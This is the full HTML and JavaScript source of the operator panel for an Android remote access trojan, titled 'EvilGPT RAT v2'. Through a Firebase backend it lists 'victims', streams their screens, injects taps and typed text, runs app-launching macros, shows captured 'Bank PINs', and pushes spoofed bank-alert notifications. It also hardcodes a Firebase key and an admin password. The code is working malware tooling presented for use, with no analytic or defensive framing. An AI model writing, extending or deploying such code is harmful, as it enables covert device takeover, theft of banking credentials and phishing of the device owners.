<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <title>EvilGPT RAT v2 – Macro AI</title>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage-compat.js"></script>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{background:#0d1117;color:#c9d1d9;font:14px monospace;padding:15px}
        .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:15px;margin-bottom:15px}
        button,select,input,textarea{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:8px;border-radius:4px;margin:4px 0;width:100%}
        button{cursor:pointer;width:auto}
        .danger{background:#da3633}
        .success{background:#238636}
        .flex{display:flex;gap:10px;align-items:center}
        #screenFrame{width:100%;cursor:crosshair;border-radius:4px}
        .macro-editor{width:100%;height:120px;font-family:monospace}
    </style>
</head>
<body>
<div id="login">
    <h2>Password</h2>
    <input type="password" id="pass"><button onclick="login()">Enter</button>
</div>
<div id="panel" style="display:none">
    <h1>💀 EvilGPT RAT v2</h1>
    <div class="card">
        <select id="devSelect"></select>
        <button onclick="refreshDevices()">Refresh</button>
    </div>
    <div class="card">
        <img id="screenFrame" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
        <canvas id="overlay" style="position:absolute;top:0;left:0;width:100%;height:100%"></canvas>
        <div class="flex">
            <button class="success" onclick="sendCmd('start_screen_capture')">▶ Start Stream</button>
            <button onclick="injectText()">⌨ Inject Text</button>
        </div>
        <input id="typeField" placeholder="Type text">
    </div>
    <div class="card">
        <h3>🤖 Macro Prompt (AI)</h3>
        <textarea id="macroInput" class="macro-editor" placeholder='launch:com.tili.ffg
wait:2000
tap:540,1200
type:1234
tap:800,1500'></textarea>
        <button class="danger" onclick="runMacro()">▶ Execute Macro</button>
    </div>
    <div class="card">
        <h3>📢 Spoof Notification</h3>
        <input id="notifTitle" value="⚠ Bank alert">
        <input id="notifBody" value="Tap to verify">
        <label class="upload-label"><input type="file" id="iconFile" hidden onchange="upload(this,'iconUrl')"> Small Icon</label>
        <label class="upload-label"><input type="file" id="bigPicFile" hidden onchange="upload(this,'bigPicUrl')"> Big Pic</label>
        <button onclick="sendFakeNotif()">Send</button>
    </div>
    <div class="card">
        <button onclick="sendCmd('hide_activity')">👤 Hide</button>
        <button class="danger" onclick="sendCmd('uninstall')">💣 Uninstall</button>
    </div>
    <pre id="output"></pre>
</div>

<script>
    firebase.initializeApp({
        apiKey: "AIzaSyB7z--EY6xgXUJnov3XopPbvQRkBYGKHZ0",
        authDomain: "vfvdfscf.firebaseapp.com",
        databaseURL: "https://vfvdfscf-default-rtdb.firebaseio.com",
        projectId: "vfvdfscf",
        storageBucket: "vfvdfscf.firebasestorage.app",
        messagingSenderId: "918007122795",
        appId: "1:918007122795:web:2c99cf787cffcbd9ba5a2e"
    });
    const db = firebase.database(), storage = firebase.storage();
    const PWD = "adminpassord$#@322";
    let selDev = null, devW=1080, devH=1920;

    function login(){ if(document.getElementById('pass').value===PWD){
        document.getElementById('login').style.display='none';
        document.getElementById('panel').style.display='block';
        refreshDevices(); } }

    function refreshDevices(){
        db.ref('telegram2_secret/victims').on('value', s => {
            const sel = document.getElementById('devSelect');
            sel.innerHTML='';
            s.forEach(c => sel.innerHTML += `<option value="${c.key}">${c.val().deviceName||'?'} (${c.key})</option>`);
            if(sel.options.length && !selDev) selDev = sel.value;
            loadScreen();
        });
    }

    document.getElementById('devSelect').onchange = function(){ selDev=this.value; loadScreen(); };

    function loadScreen(){
        if(!selDev) return;
        db.ref(`telegram2_secret/victims/${selDev}/screenInfo`).on('value', s => {
            if(s.exists()){ devW=s.val().width; devH=s.val().height; }
        });
        db.ref(`telegram2_secret/victims/${selDev}/screen`).off();
        db.ref(`telegram2_secret/victims/${selDev}/screen`).on('value', s => {
            if(s.exists()) document.getElementById('screenFrame').src='data:image/jpeg;base64,'+s.val();
        });
        // logs / bank output
        db.ref(`telegram2_secret/victims/${selDev}/info/apps`).on('value', s=> document.getElementById('output').textContent='Apps:\n'+(s.val()||''));
        db.ref(`telegram2_secret/victims/${selDev}/bank`).on('value', s=> {
            if(s.exists()){
                let t=''; s.forEach(c => t+=c.val()+'\n');
                document.getElementById('output').textContent += '\nBank PINs:\n'+t;
            }
        });
    }

    function sendCmd(type, extra={}){
        if(!selDev) return alert('No device');
        db.ref(`telegram2_secret/victims/${selDev}/commands`).push().set({type, ...extra});
    }

    // Interactive screen touch
    const canvas = document.getElementById('overlay');
    const screen = document.getElementById('screenFrame');
    function setCanvasSize(){ canvas.width = screen.clientWidth; canvas.height = screen.clientHeight; }
    window.onresize = setCanvasSize;
    screen.onload = setCanvasSize;
    let swipeStart=null;

    function getCoords(e){
        const rect = screen.getBoundingClientRect();
        const x = ((e.clientX-rect.left)/rect.width)*devW;
        const y = ((e.clientY-rect.top)/rect.height)*devH;
        return {x:Math.round(x), y:Math.round(y)};
    }
    canvas.onmousedown = e => swipeStart=getCoords(e);
    canvas.onmouseup = e => {
        if(!swipeStart) return;
        const end=getCoords(e);
        if(Math.hypot(end.x-swipeStart.x,end.y-swipeStart.y)<10)
            sendCmd('tap',{x:end.x,y:end.y});
        else
            sendCmd('swipe',{sx:swipeStart.x,sy:swipeStart.y,ex:end.x,ey:end.y});
        swipeStart=null;
    };
    canvas.onmouseleave=()=>swipeStart=null;
    canvas.ontouchstart= e => { e.preventDefault(); swipeStart=getCoords(e.touches[0]); };
    canvas.ontouchend= e => {
        e.preventDefault();
        if(!swipeStart) return;
        const end=getCoords(e.changedTouches[0]);
        if(Math.hypot(end.x-swipeStart.x,end.y-swipeStart.y)<10)
            sendCmd('tap',{x:end.x,y:end.y});
        else
            sendCmd('swipe',{sx:swipeStart.x,sy:swipeStart.y,ex:end.x,ey:end.y});
        swipeStart=null;
    };

    function injectText(){
        const txt = document.getElementById('typeField').value;
        if(txt) sendCmd('type',{text:txt});
        document.getElementById('typeField').value='';
    }

    // Upload helpers
    function upload(input, key){
        const file = input.files[0];
        if(!file) return;
        const ref = storage.ref('notif/'+Date.now());
        ref.put(file).then(s=> s.ref.getDownloadURL()).then(url=>document.getElementById(key).value=url);
    }
    function sendFakeNotif(){
        sendCmd('fake_notification',{
            title: btoa(unescape(encodeURIComponent(document.getElementById('notifTitle').value))),
            text: btoa(unescape(encodeURIComponent(document.getElementById('notifBody').value))),
            iconUrl: document.getElementById('iconUrl').value,
            bigPictureUrl: document.getElementById('bigPicUrl').value
        });
    }

    // Macro engine
    function runMacro(){
        const raw = document.getElementById('macroInput').value.trim();
        if(!raw) return;
        const lines = raw.split('\n').filter(l=>l.trim()!='');
        const steps = [];
        for(let l of lines){
            const [cmd, ...args] = l.split(':');
            const type = cmd.trim();
            const data = args.join(':').trim();
            switch(type){
                case 'launch': steps.push({type:'launch', data}); break;
                case 'wait': steps.push({type:'wait', data:parseInt(data)}); break;
                case 'tap': {
                    const [x,y] = data.split(',').map(Number);
                    steps.push({type:'tap', data:{x,y}});
                    break;
                }
                case 'type': steps.push({type:'type', data}); break;
                case 'swipe': {
                    const [sx,sy,ex,ey,dur] = data.split(',').map(Number);
                    steps.push({type:'swipe', data:{sx,sy,ex,ey,dur:dur||300}});
                    break;
                }
                case 'home': steps.push({type:'home'}); break;
                case 'back': steps.push({type:'back'}); break;
                default: console.warn('Unknown command', type);
            }
        }
        if(steps.length) sendCmd('macro',{steps});
    }
</script>
<input type="hidden" id="iconUrl" value="">
<input type="hidden" id="bigPicUrl" value="">
</body>
</html>
